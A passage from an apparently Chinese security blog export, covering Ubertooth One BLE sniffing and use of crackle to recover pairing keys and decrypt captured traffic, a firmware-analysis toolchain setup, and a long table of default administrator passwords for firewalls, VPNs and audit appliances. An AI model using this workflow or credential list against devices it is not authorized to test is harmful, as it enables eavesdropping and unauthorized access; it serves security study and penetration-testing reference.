<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015093808357.png" alt="image-20201015093808357"></p>
<h4 id="c-spectool-raw"><a href="#c-spectool-raw" class="headerlink" title="c. spectool_raw"></a>c. spectool_raw</h4><p>RAW中文的解释是“原材料”或“未经过处理的东西”，这里猜测是显示设备捕获到的未经处理的信号数据：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015094038013.png" alt="image-20201015094038013"></p>
<h4 id="d-spectool-net"><a href="#d-spectool-net" class="headerlink" title="d. spectool_net"></a>d. spectool_net</h4><p>将Ubertooth One作为一台“硬件服务器”，并监听TCP：30569端口，局域网内任何可以跟主机建立通信的PC可通过Ubertoothe主机IP+30569共享设备。连接方式：在另外一台主机终端上执行：spectool_gtk</p>
<p>—&gt;选择Open Network Device —&gt;输入ip、端口</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015094733056.png" alt="image-20201015094733056"></p>
<h3 id="2-Hcitool"><a href="#2-Hcitool" class="headerlink" title="2. Hcitool"></a>2. Hcitool</h3><p>hcitool –help</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hcitool - HCI Tool ver 5.48</span><br><span class="line">Usage:</span><br><span class="line">	hcitool [options] &lt;command&gt; [command parameters]</span><br><span class="line">Options:</span><br><span class="line">	--help	Display help</span><br><span class="line">	-i dev	HCI device</span><br><span class="line">Commands:</span><br><span class="line">	dev 	Display local devices</span><br><span class="line">	inq 	Inquire remote devices</span><br><span class="line">	scan	Scan for remote devices</span><br><span class="line">	name	Get name from remote device</span><br><span class="line">	info	Get information from remote device</span><br><span class="line">	spinq	Start periodic inquiry</span><br><span class="line">	epinq	Exit periodic inquiry</span><br><span class="line">	cmd 	Submit arbitrary HCI commands</span><br><span class="line">	con 	Display active connections</span><br><span class="line">	cc  	Create connection to remote device</span><br><span class="line">	dc  	Disconnect from remote device</span><br><span class="line">	sr  	Switch master&#x2F;slave role</span><br><span class="line">	cpt 	Change connection packet type</span><br><span class="line">	rssi	Display connection RSSI</span><br><span class="line">	lq  	Display link quality</span><br><span class="line">	tpl 	Display transmit power level</span><br><span class="line">	afh 	Display AFH channel map</span><br><span class="line">	lp  	Set&#x2F;display link policy settings</span><br><span class="line">	lst 	Set&#x2F;display link supervision timeout</span><br><span class="line">	auth	Request authentication</span><br><span class="line">	enc 	Set connection encryption</span><br><span class="line">	key 	Change connection link key</span><br><span class="line">	clkoff	Read clock offset</span><br><span class="line">	clock	Read local or remote clock</span><br><span class="line">	lescan	Start LE scan</span><br><span class="line">	leinfo	Get LE remote information</span><br><span class="line">	lewladd	Add device to LE White List</span><br><span class="line">	lewlrm	Remove device from LE White List</span><br><span class="line">	lewlsz	Read size of LE White List</span><br><span class="line">	lewlclr	Clear LE White List</span><br><span class="line">	lerladd	Add device to LE Resolving List</span><br><span class="line">	lerlrm	Remove device from LE Resolving List</span><br><span class="line">	lerlclr	Clear LE Resolving List</span><br><span class="line">	lerlsz	Read size of LE Resolving List</span><br><span class="line">	lerlon	Enable LE Address Resolution</span><br><span class="line">	lerloff	Disable LE Address Resolution</span><br><span class="line">	lecc	Create a LE Connection</span><br><span class="line">	ledc	Disconnect a LE Connection</span><br><span class="line">	lecup	LE Connection Update</span><br><span class="line"></span><br><span class="line">For more information on the usage of each command use:</span><br><span class="line">	hcitool &lt;command&gt; --help</span><br></pre></td></tr></table></figure>

<p>hcitool scan :扫描附近蓝牙设备</p>
<p>hcitool lescan :扫描附近低功耗蓝牙设备</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015095601031.png" alt="image-20201015095601031"></p>
<h3 id="3-Gatttool"><a href="#3-Gatttool" class="headerlink" title="3. Gatttool"></a>3. Gatttool</h3><p> gatttool -h</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  gatttool [OPTION?]</span><br><span class="line"></span><br><span class="line">Help Options:</span><br><span class="line">  -h, --help                                Show help options</span><br><span class="line">  --help-all                                Show all help options</span><br><span class="line">  --help-gatt                               Show all GATT commands</span><br><span class="line">  --help-params                             Show all Primary Services&#x2F;Characteristics arguments</span><br><span class="line">  --help-char-read-write                    Show all Characteristics Value&#x2F;Descriptor Read&#x2F;Write arguments</span><br><span class="line"></span><br><span class="line">Application Options:</span><br><span class="line">  -i, --adapter&#x3D;hciX                        Specify local adapter interface</span><br><span class="line">  -b, --device&#x3D;MAC                          Specify remote Bluetooth address</span><br><span class="line">  -t, --addr-type&#x3D;[public | random]         Set LE address type. Default: public</span><br><span class="line">  -m, --mtu&#x3D;MTU                             Specify the MTU size</span><br><span class="line">  -p, --psm&#x3D;PSM                             Specify the PSM for GATT&#x2F;ATT over BR&#x2F;EDR</span><br><span class="line">  -l, --sec-level&#x3D;[low | medium | high]     Set security level. Default: low</span><br><span class="line">  -I, --interactive                         Use interactive mode</span><br></pre></td></tr></table></figure>

<p>gatttool -b EC:F3:42:B2:DF:24 -I</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015100005087.png" alt="image-20201015100005087"></p>
<h3 id="4-Ubertooth-scan-s"><a href="#4-Ubertooth-scan-s" class="headerlink" title="4. Ubertooth-scan -s"></a>4. Ubertooth-scan -s</h3><p>sudo apt install ubertooth</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015104856092.png" alt="image-20201015104856092"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015104915904.png" alt="image-20201015104915904"></p>
<h3 id="5-Ubertooth-ble"><a href="#5-Ubertooth-ble" class="headerlink" title="5. Ubertooth-ble"></a>5. Ubertooth-ble</h3><pre><code>ubertooth-btle - passive Bluetooth Low Energy monitoring
Usage:
    -h this help

    Major modes:
    -f follow connections
    -p promiscuous: sniff active connections
    -a[address] get/set access address (example: -a8e89bed6)
    -s&lt;address&gt; faux slave mode, using MAC addr (example: -s22:44:66:88:aa:cc)
    -t&lt;address&gt; set connection following target (example: -t22:44:66:88:aa:cc)

    Interference (use with -f or -p):
    -i interfere with one connection and return to idle
    -I interfere continuously

    Data source:
    -U&lt;0-7&gt; set ubertooth device to use

    Misc:
    -r&lt;filename&gt; capture packets to PCAPNG file
    -q&lt;filename&gt; capture packets to PCAP file (DLT_BLUETOOTH_LE_LL_WITH_PHDR)
    -c&lt;filename&gt; capture packets to PCAP file (DLT_PPI)
    -A&lt;index&gt; advertising channel index (default 37)
    -v[01] verify CRC mode, get status or enable/disable
    -x&lt;n&gt; allow n access address offenses (default 32)

If an input file is not specified, an Ubertooth device is used for live capture.
In get/set mode no capture occurs.</code></pre><blockquote>
<p>ubertooth-btle -f -c test.pcap抓包&amp;保存到本地</p>
</blockquote>
<p>使用这条命令我们可以把设备捕获到的数据包保存到本地，完成后可导入wireshark进行数据包、协议分析。</p>
<p>wireshark导入嗅探到的蓝牙数据包需要处理一下才能正常查看，不然无法正常分析数据：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015113803864.png" alt="image-20201015113803864"></p>
<p>Edit → Preferences → Protocols → DLT_USER → Edit → New</p>
<p>在payload protocol中输入btle</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015110349788.png" alt="image-20201015110349788"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015113903595.png" alt="image-20201015113903595"></p>
<p>使用规则过滤数据包：参考<a href="https://github.com/greatscottgadgets/ubertooth/wiki/Capturing-BLE-in-Wireshark">Capturing BLE in Wireshark</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">btle.data_header.length &gt; 0 || btle.advertising_header.pdu_type &#x3D;&#x3D; 0x05</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015114932731.png" alt="image-20201015114932731"></p>
<h3 id="6-crackle"><a href="#6-crackle" class="headerlink" title="6. crackle"></a>6. crackle</h3><p>如果捕获到足够的数据包尤其是btsmp，抓到包之后我们最关心的问题是我们有没有抓到的足够的包来破解tk。所以在wireshark中你可以在filter处加上btsmp，确保抓到了我们需要的6个包。，那接下来便可以用crackle来破解tk和ltk：</p>
<p><strong>做到这个点尝试了身边的一些设备的连接没抓到大量包没有至少6个btsmp之后实践中碰到补足图片</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackle -i &lt;file.pcap&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015115144837.png" alt="image-20201015115144837"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">从上图中我们可以看到我们不但破解了tk，还利用利用tk和其它一些数据成功的还原出了ltk。</span><br><span class="line"></span><br><span class="line">接下来我们再来试试利用获取的ltk来破解其他的加密包。假设我们在配对过程中已经拿到了ltk&#x3D;7f62c053f104a5bbe68b1d896a2ed49c</span><br></pre></td></tr></table></figure>

<p>解密数据包，并把解密后的包另存：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackle -i &lt;file.pcap&gt; -o &lt;output.pcap&gt;</span><br><span class="line">crackle -i &lt;file.pcap&gt; -o &lt;out.pcap&gt; -l &lt;ltk&gt;</span><br><span class="line"></span><br><span class="line">crackle -l 7f62c053f104a5bbe68b1d896a2ed49c -i test44.pcap -o test66.pcap</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015115842434.png" alt="image-20201015115842434"></p>
<p>可以看到成功破解了7个包</p>
<h2 id="0x03-解决方案"><a href="#0x03-解决方案" class="headerlink" title="0x03 解决方案"></a>0x03 解决方案</h2><h4 id="1-使用OOB"><a href="#1-使用OOB" class="headerlink" title="1. 使用OOB"></a>1. 使用OOB</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[email protected]:~&#x2F;Desktop# crackle -i heart.pcap </span><br><span class="line">Warning: No output file specified. Won&#39;t decrypt any packets.</span><br><span class="line">Warning: found multiple connects, only using the latest one</span><br><span class="line">Warning: found multiple LL_ENC_REQ, only using latest one</span><br><span class="line">Warning: found multiple connects, only using the latest one</span><br><span class="line">Warning: found multiple pairing requests, only using the latest one</span><br><span class="line">Warning: found multiple connects, only using the latest one</span><br><span class="line">Warning: found multiple pairing requests, only using the latest one</span><br><span class="line">Warning: already saw two random values, skipping</span><br><span class="line">Warning: found multiple LL_ENC_REQ, only using latest one</span><br><span class="line">TK not found, the connection is probably using OOB pairing</span><br><span class="line">Sorry d00d :(</span><br></pre></td></tr></table></figure>

<h4 id="2-支持bluetooth4-2以上的设备的出现（通过ECDH解决）"><a href="#2-支持bluetooth4-2以上的设备的出现（通过ECDH解决）" class="headerlink" title="2. 支持bluetooth4.2以上的设备的出现（通过ECDH解决）"></a>2. 支持bluetooth4.2以上的设备的出现（通过ECDH解决）</h4><h2 id="0x04-参考："><a href="#0x04-参考：" class="headerlink" title="0x04 参考："></a>0x04 参考：</h2><p><a href="http://www.vuln.cn/6083">http://www.vuln.cn/6083</a></p>
<p><a href="https://blog.csdn.net/charmve/article/details/107170250">https://blog.csdn.net/charmve/article/details/107170250</a></p>
<p><a href="https://www.freebuf.com/articles/wireless/106298.html">路人甲@乌云drops:Bluetooth Low Energy 嗅探</a></p>
<p><a href="http://j2abro.blogspot.com.au/2014/06/understanding-bluetooth-advertising.html">疯狗@乌云drops：物联网安全拔“牙”实战——低功耗蓝牙（BLE）初探</a></p>
<p><a href="https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide">https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide</a></p>
<p><a href="https://github.com/greatscottgadgets/ubertooth/wiki/Capturing-BLE-in-Wireshark">https://github.com/greatscottgadgets/ubertooth/wiki/Capturing-BLE-in-Wireshark</a></p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>BLE</tag>
        <tag>Ubertooth one</tag>
        <tag>SDK</tag>
      </tags>
  </entry>
  <entry>
    <title>固件环境搭建</title>
    <url>/2020/09/12/IOT/%E5%9B%BA%E4%BB%B6%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://gitee.com/h4lo1/HatLab_Tools_Library">https://gitee.com/h4lo1/HatLab_Tools_Library</a></p>
<h3 id="binwalk："><a href="#binwalk：" class="headerlink" title="binwalk："></a>binwalk：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;devttys0&#x2F;binwalk.git</span><br><span class="line">cd binwalk</span><br><span class="line">sudo .&#x2F;deps.sh</span><br><span class="line">sudo python .&#x2F;setup.py install</span><br><span class="line">sudo apt-get install python-lzma</span><br><span class="line">sudo -H pip install git+https:&#x2F;&#x2F;github.com&#x2F;ahupp&#x2F;python-magic</span><br><span class="line">sudo -H pip install git+https:&#x2F;&#x2F;github.com&#x2F;sviehb&#x2F;jefferson</span><br></pre></td></tr></table></figure>

<h3 id="firmadyne："><a href="#firmadyne：" class="headerlink" title="firmadyne："></a>firmadyne：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;firmadyne&#x2F;firmadyne</span><br><span class="line">cd firmadyne&#x2F; &amp;&amp; sudo download.sh</span><br><span class="line">sudo -u postgres createuser -P firmadyne    password: firmadyne</span><br><span class="line">	 </span><br><span class="line">sudo -u postgres createdb -O firmadyne firmware</span><br><span class="line">sudo -u postgres psql -d firmware &lt; .&#x2F;firmadyne&#x2F;database&#x2F;schema</span><br></pre></td></tr></table></figure>

<h3 id="qemu-2-4-0"><a href="#qemu-2-4-0" class="headerlink" title="qemu-2.4.0:"></a>qemu-2.4.0:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;download.qemu.org&#x2F;qemu-2.4.0.tar.xz</span><br><span class="line">tar xvf qemu-2.4.0.tar.xz &amp;&amp; cd qemu-2.4.0&#x2F;</span><br><span class="line">.&#x2F;configure --target-list&#x3D;arm-softmmu,mips-softmmu,mipsel-softmmu --audio-drv-list&#x3D;alsa,pa</span><br><span class="line">make -j8</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h3 id="gdb-multiarch"><a href="#gdb-multiarch" class="headerlink" title="gdb-multiarch:"></a>gdb-multiarch:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install gdb-multiarch</span><br></pre></td></tr></table></figure>

<h3 id="gdbserver"><a href="#gdbserver" class="headerlink" title="gdbserver:"></a>gdbserver:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;hugsy&#x2F;gdb-static</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;akpotter&#x2F;embedded-toolkit</span><br></pre></td></tr></table></figure>

<h3 id="IDA-脚本"><a href="#IDA-脚本" class="headerlink" title="IDA 脚本"></a>IDA 脚本</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;giantbranch&#x2F;mipsAudit</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;tigerpuma&#x2F;idatool-devttys0-</span><br></pre></td></tr></table></figure>

<h2 id="Ghidra"><a href="#Ghidra" class="headerlink" title="Ghidra"></a>Ghidra</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.nsa.gov&#x2F;resources&#x2F;everyone&#x2F;ghidra&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="cutter"><a href="#cutter" class="headerlink" title="cutter"></a>cutter</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;radareorg&#x2F;cutter</span><br></pre></td></tr></table></figure>

<h3 id="qemu-system-arm"><a href="#qemu-system-arm" class="headerlink" title="qemu_system_arm"></a>qemu_system_arm</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;people.debian.org&#x2F;~aurel32&#x2F;qemu&#x2F;armhf&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="firmwalker"><a href="#firmwalker" class="headerlink" title="firmwalker"></a>firmwalker</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;craigz28&#x2F;firmwalker</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>iot</tag>
      </tags>
  </entry>
  <entry>
    <title>默认设备密码</title>
    <url>/2020/09/12/IOT/%E9%BB%98%E8%AE%A4%E8%AE%BE%E5%A4%87%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h2 id="设备默认密码"><a href="#设备默认密码" class="headerlink" title="设备默认密码"></a>设备默认密码</h2><table>
<thead>
<tr>
<th align="center">设备</th>
<th align="center">默认账号</th>
<th align="center">默认密码</th>
</tr>
</thead>
<tbody><tr>
<td align="center">深信服产品</td>
<td align="center">sangfor</td>
<td align="center">sangfor/sangfor@2018/sangfor@2019</td>
</tr>
<tr>
<td align="center">深信服科技AD</td>
<td align="center">sangfor</td>
<td align="center">dlanrecover</td>
</tr>
<tr>
<td align="center">深信服负载均衡 AD 3.6</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">深信服WAC（WNS V2.6）</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">深信服v-p-n</td>
<td align="center">Admin</td>
<td align="center">Admin</td>
</tr>
<tr>
<td align="center">深信服-ipsec-V-P-N（SSL 5.5）</td>
<td align="center">Admin</td>
<td align="center">Admin</td>
</tr>
<tr>
<td align="center">深信服AC6.0</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">SANGFOR防火墙</td>
<td align="center">admin</td>
<td align="center">sangfor</td>
</tr>
<tr>
<td align="center">深信服AF（NGAF V2.2）</td>
<td align="center">admin</td>
<td align="center">sangfor</td>
</tr>
<tr>
<td align="center">深信服NGAF下一代应用防火墙（NGAF V4.3）</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">深信服AD3.9</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">深信服上网行为管理设备数据中心</td>
<td align="center">Admin</td>
<td align="center">密码为空</td>
</tr>
<tr>
<td align="center">SANGFOR_AD_v5.1</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">网御漏洞扫描系统</td>
<td align="center">leadsec</td>
<td align="center">leadsec</td>
</tr>
<tr>
<td align="center">天闻入侵检测和管理系统V7.0</td>
<td align="center">Admin</td>
<td align="center">venus70</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">Audit</td>
<td align="center">venus70</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">adm</td>
<td align="center">venus70</td>
</tr>
<tr>
<td align="center">天闻入侵检测和管理系统V6.0</td>
<td align="center">Admin</td>
<td align="center">venus60</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">Audit</td>
<td align="center">venus60</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">adm</td>
<td align="center">venus60</td>
</tr>
<tr>
<td align="center">网御WAF集中控制中心（V3.0R5.0）</td>
<td align="center">admin</td>
<td align="center">leadsec.waf</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">audit</td>
<td align="center">leadsec.waf</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">adm</td>
<td align="center">leadsec.waf</td>
</tr>
<tr>
<td align="center">联想网御</td>
<td align="center">administrator</td>
<td align="center">administrator</td>
</tr>
<tr>
<td align="center">网御事件服务器</td>
<td align="center">admin</td>
<td align="center">admin123</td>
</tr>
<tr>
<td align="center">联想网御入侵检测系统v3.2.72.0</td>
<td align="center">adm</td>
<td align="center">leadsec32</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">admin</td>
<td align="center">leadsec32</td>
</tr>
<tr>
<td align="center">联想网御防火墙PowerV</td>
<td align="center">administrator</td>
<td align="center">administrator</td>
</tr>
<tr>
<td align="center">联想网御入侵检测系统</td>
<td align="center">lenovo</td>
<td align="center">default</td>
</tr>
<tr>
<td align="center">网络卫视入侵检测系统</td>
<td align="center">admin</td>
<td align="center">talent</td>
</tr>
<tr>
<td align="center">联想网御入侵检测系统IDS</td>
<td align="center">root</td>
<td align="center">111111</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">admin</td>
<td align="center">admin123</td>
</tr>
<tr>
<td align="center">科来网络回溯分析系统</td>
<td align="center">csadmin</td>
<td align="center">colasoft</td>
</tr>
<tr>
<td align="center">中控考勤机web3.0</td>
<td align="center">administrator</td>
<td align="center">123456</td>
</tr>
<tr>
<td align="center">H3C IMC</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">H3C SecPath系列</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">H3C S520-SI</td>
<td align="center">test</td>
<td align="center">123</td>
</tr>
<tr>
<td align="center">H3C 智能管理中心</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">H3C RE3100</td>
<td align="center">admin</td>
<td align="center">adminer3100</td>
</tr>
<tr>
<td align="center">H3C RE3200</td>
<td align="center">admin</td>
<td align="center">adminer3200</td>
</tr>
<tr>
<td align="center">H3C RE3260</td>
<td align="center">admin</td>
<td align="center">adminer3260</td>
</tr>
<tr>
<td align="center">H3C</td>
<td align="center">admin</td>
<td align="center">adminer</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">admin</td>
<td align="center">h3capadmin</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">h3c</td>
<td align="center">h3c</td>
</tr>
<tr>
<td align="center">360天擎</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">网神防火墙</td>
<td align="center">firewall</td>
<td align="center">firewall</td>
</tr>
<tr>
<td align="center">天融信防火墙NGFW4000</td>
<td align="center">superman</td>
<td align="center">talent</td>
</tr>
<tr>
<td align="center">黑盾防火墙</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">rule</td>
<td align="center">abc123</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">audit</td>
<td align="center">abc123</td>
</tr>
<tr>
<td align="center">华为防火墙</td>
<td align="center">telnetuser</td>
<td align="center">telnetpwd</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">ftpuser</td>
<td align="center">ftppwd</td>
</tr>
<tr>
<td align="center">方正防火墙</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">飞塔防火墙</td>
<td align="center">admin</td>
<td align="center">密码为空</td>
</tr>
<tr>
<td align="center">Juniper_SSG_5防火墙</td>
<td align="center">netscreen</td>
<td align="center">netscreen</td>
</tr>
<tr>
<td align="center">中新金盾硬件防火墙</td>
<td align="center">admin</td>
<td align="center">123</td>
</tr>
<tr>
<td align="center">kill防火墙（冠群金辰）</td>
<td align="center">admin</td>
<td align="center">sys123</td>
</tr>
<tr>
<td align="center">天清汉马USG防火墙</td>
<td align="center">admin</td>
<td align="center">venus.fw</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">Audit</td>
<td align="center">venus.audit</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">useradmin</td>
<td align="center">venus.user</td>
</tr>
<tr>
<td align="center">阿姆瑞特防火墙</td>
<td align="center">admin</td>
<td align="center">manager</td>
</tr>
<tr>
<td align="center">山石网科</td>
<td align="center">hillstone</td>
<td align="center">hillstone</td>
</tr>
<tr>
<td align="center">绿盟安全审计系统</td>
<td align="center">weboper</td>
<td align="center">weboper</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">webaudit</td>
<td align="center">webaudit</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">conadmin</td>
<td align="center">conadmin</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">shell</td>
<td align="center">shell</td>
</tr>
<tr>
<td align="center">绿盟产品</td>
<td align="center"></td>
<td align="center">nsfocus123</td>
</tr>
<tr>
<td align="center">TopAudit日志审计系统</td>
<td align="center">superman</td>
<td align="center">talent</td>
</tr>
<tr>
<td align="center">LogBase日志管理综合审计系统</td>
<td align="center">admin</td>
<td align="center">safetybase</td>
</tr>
<tr>
<td align="center">网神SecFox韵味安全管理与审计系统</td>
<td align="center">admin</td>
<td align="center">!1fw@2soc#3v-p-n</td>
</tr>
<tr>
<td align="center">天融信数据库审计系统</td>
<td align="center">superman</td>
<td align="center">telent</td>
</tr>
<tr>
<td align="center">Hillstone安全审计平台</td>
<td align="center">hillstone</td>
<td align="center">hillstone</td>
</tr>
<tr>
<td align="center">网康日志中心</td>
<td align="center">ns25000</td>
<td align="center">ns25000</td>
</tr>
<tr>
<td align="center">网络安全审计系统（中科新业）</td>
<td align="center">admin</td>
<td align="center">123456</td>
</tr>
<tr>
<td align="center">天玥网络安全审计系统</td>
<td align="center">Admin</td>
<td align="center">cyberaudit</td>
</tr>
<tr>
<td align="center">明御WEB应用防火墙</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">admin</td>
<td align="center">adminadmin</td>
</tr>
<tr>
<td align="center">明御攻防实验室平台</td>
<td align="center">root</td>
<td align="center">123456</td>
</tr>
<tr>
<td align="center">明御安全网关</td>
<td align="center">admin</td>
<td align="center">adminadmin</td>
</tr>
<tr>
<td align="center">明御运维审计与册风险控制系统</td>
<td align="center">admin</td>
<td align="center">1q2w3e</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">system</td>
<td align="center">1q2w3e4r</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">auditor</td>
<td align="center">1q2w3e4r</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">operator</td>
<td align="center">1q2w3e4r</td>
</tr>
<tr>
<td align="center">明御网站卫士</td>
<td align="center">sysmanager</td>
<td align="center">sysmanager888</td>
</tr>
<tr>
<td align="center">亿邮邮件网关</td>
<td align="center">eyouuser</td>
<td align="center">eyou_admin</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">eyougw</td>
<td align="center">admin@(eyou)</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">admin</td>
<td align="center">+ccccc</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">admin</td>
<td align="center">cyouadmin</td>
</tr>
<tr>
<td align="center">Websense邮件安全网关</td>
<td align="center">administrator</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">梭子鱼邮件存储网关</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">天行光闸</td>
<td align="center">super</td>
<td align="center">TopFGAP123</td>
</tr>
<tr>
<td align="center">天行光闸</td>
<td align="center">admin</td>
<td align="center">Topwalkadmin123</td>
</tr>
<tr>
<td align="center">天融信防火墙</td>
<td align="center">superman</td>
<td align="center">talent!23</td>
</tr>
<tr>
<td align="center">联想网御防火墙</td>
<td align="center">admin</td>
<td align="center">eadsec@7766/administrator/bane@7766</td>
</tr>
<tr>
<td align="center">深信服防火墙</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">启明星辰</td>
<td align="center">admin</td>
<td align="center">bane@7766</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center">admin@123</td>
</tr>
<tr>
<td align="center">juniper</td>
<td align="center">netscreen</td>
<td align="center">netscreen</td>
</tr>
<tr>
<td align="center">Cisco</td>
<td align="center">admin</td>
<td align="center">cisco</td>
</tr>
<tr>
<td align="center">Huawei</td>
<td align="center">admin</td>
<td align="center">Admin@123</td>
</tr>
<tr>
<td align="center">深信服VPN</td>
<td align="center">51111端口</td>
<td align="center">delanrecover</td>
</tr>
<tr>
<td align="center">华为VPN</td>
<td align="center">root</td>
<td align="center">mduadmin</td>
</tr>
<tr>
<td align="center">华为防火墙</td>
<td align="center">admin</td>
<td align="center">Admin@123</td>
</tr>
<tr>
<td align="center">EudemonJuniper防火墙</td>
<td align="center">netscreen</td>
<td align="center">netscreen</td>
</tr>
<tr>
<td align="center">迪普</td>
<td align="center">admin</td>
<td align="center">admin_default</td>
</tr>
<tr>
<td align="center">安恒的明御防火墙</td>
<td align="center">admin</td>
<td align="center">adminadmin</td>
</tr>
<tr>
<td align="center">某堡垒机</td>
<td align="center">shterm</td>
<td align="center">shterm</td>
</tr>
<tr>
<td align="center">天融信的VPN</td>
<td align="center">test</td>
<td align="center">123456</td>
</tr>
<tr>
<td align="center">奇安信所有产品</td>
<td align="center">Admin</td>
<td align="center">!1ws</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>路由器</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>默认密码</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下的字典生成工具Crunch，创造自己的专属字典</title>
